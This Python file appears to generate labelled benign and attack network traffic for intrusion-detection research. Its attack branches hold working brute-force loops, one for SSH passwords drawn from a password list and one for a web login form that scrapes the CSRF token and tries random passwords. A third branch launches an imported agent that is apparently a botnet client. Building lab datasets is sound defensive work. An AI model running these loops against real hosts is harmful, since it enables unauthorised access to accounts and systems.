import paramiko, string, random
import numpy as np

from time import sleep
from agent import *

def app_sessions(app, remote, label, sleep_interval=1):
    if app == 'ares':
        agent = Agent(remote)
        agent.run()
    elif app == 'ssh':
        if label == 0:
            with open('cmdlist.txt', 'r') as f:
                lines = f.readlines()
            try:
                ssh = ssh_connect(remote)
                while True:
                    cmd = np.random.choice(lines).strip()
                    ssh_command(ssh, cmd)
                    sleep(np.random.rand() * sleep_interval)
            except:
                sleep(np.random.rand() * sleep_interval)

        else:
            with open('passlist.txt', 'r') as f:
                lines = f.readlines()
            while True:
                try:
                    up = np.random.choice(lines).strip().split(':')
                    ssh_connect(remote, user=up[0], password=up[1])
                except:
                    pass
    elif app == 'web':
        if label == 0:
            with open('urilist.txt', 'r') as f:
                lines = f.readlines()
            try:
                s = requests.Session()
                uri = 'http://{0}:80/login.php'.format(remote)
                r = s.get(uri)
                for line in r.content.decode().split('\r\n'):
                    if 'user_token' in line:
                        spl = line.split('value=')
                        user_token = spl[1].split('/>')[0][1:-2]
                        break
                data_dict = {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': user_token}
                r = s.post(uri, data=data_dict)
                while True:
                    uri = 'http://{0}:80{1}'.format(remote, np.random.choice(lines).strip())
                    s.get(uri)
                    sleep(np.random.rand() * sleep_interval)
            except:
                sleep(np.random.rand() * sleep_interval)
        else:
            sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sckt.connect((remote, 80))
            packet_as_a_list = [
                'GET /login.php HTTP/1.1',
                'Host: {0}'.format(remote),
                'User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5\r\n\r\n'
            ]
            pkt = '\r\n'.join(packet_as_a_list)
            sckt.sendall(pkt.encode('utf-8'))
            ut, c = process_reply(sckt)
            while True:
                password = ''.join(random.choices(string.ascii_letters + string.digits, k=np.random.randint(32, 48)))
                content = 'username=admin&password={0}&Login=Login&user_token={1}'.format(password, ut)
                packet_as_a_list = [
                    'POST /login.php HTTP/1.1',
                    'Host: {0}'.format(remote),
                    'User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
                    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language: en-US,en;q=0.5',
                    'Cookie: {0}'.format(c),
                    'Content-Length: {0}\r\n\r\n{1}'.format(len(content), content)
                ]
                pkt = '\r\n'.join(packet_as_a_list)
                sckt.sendall(pkt.encode('utf-8'))
                ut, c = process_reply(sckt)

def process_reply(sckt, user_token=None, cookie=None):
    try:
        reply = sckt.recv(4096).decode('utf-8')
        lines = reply.split('\r\n')
        if user_token is None:
            for line in lines:
                if 'user_token' in line:
                    spl = line.split('value=')
                    user_token = spl[1].split('/>')[0][1:-2]
                    break
        if cookie is None:
            cookie_list = []
            spl = reply.split('Set-Cookie: ')
            for item in spl[1:]:
                cookie_value = item.split(';')[0]
                if cookie_value not in cookie_list:
                    cookie_list.append(cookie_value)
            cookie = ';'.join(cookie_list)
    except Exception as e:
        print(e)
    return user_token, cookie

def ssh_connect(ip, user='izi', password='izi', timeout=1):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, username=user, password=password, timeout=timeout)
    return ssh

def ssh_command(ssh, command, sleeptime=0.001):
    stdin, stdout, stderr = ssh.exec_command(command)
    while not stdout.channel.exit_status_ready():
        sleep(sleeptime)
    return stdout.readlines()

class AppServer():

    def __init__(self):
        pass

    def serve(self):
        while True:
            sleep(1)

